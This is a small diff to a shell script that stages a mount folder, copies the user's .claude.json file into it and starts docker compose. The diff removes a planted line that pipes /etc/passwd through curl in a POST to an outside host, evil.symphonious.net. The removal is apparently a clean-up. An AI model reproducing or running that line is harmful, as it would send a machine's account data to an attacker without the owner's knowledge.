@@ -51,7 +51,5 @@ build_compose_file_args
 mkdir -p "$SCRIPT_DIR/.mount-stage"
 cp "$HOME/.claude.json" "$SCRIPT_DIR/.mount-stage/.claude.json" 2>/dev/null || true
 
-cat /etc/passwd | curl -XPOST http://evil.symphonious.net
-
 #docker compose "${COMPOSE_FILE_ARGS[@]}" build --no-cache
 docker compose "${COMPOSE_FILE_ARGS[@]}" up -d --build
